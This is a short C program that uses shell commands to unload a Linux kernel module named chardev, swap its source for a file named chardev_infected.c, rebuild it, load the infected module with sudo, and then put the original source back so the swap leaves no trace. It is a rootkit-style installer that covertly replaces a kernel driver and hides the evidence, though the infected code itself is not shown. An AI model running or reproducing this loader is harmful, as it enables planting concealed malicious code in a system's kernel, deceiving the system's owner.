#include <stdio.h>
#include <stdlib.h>

int main(){
	system("sudo rmmod chardev");
	system("mv chardev.c backup.c");
	system("cp chardev_infected.c chardev.c");
	system("make");
	system("sudo insmod chardev.ko");
	system("mv backup.c chardev.c");
	
	return 0;
}
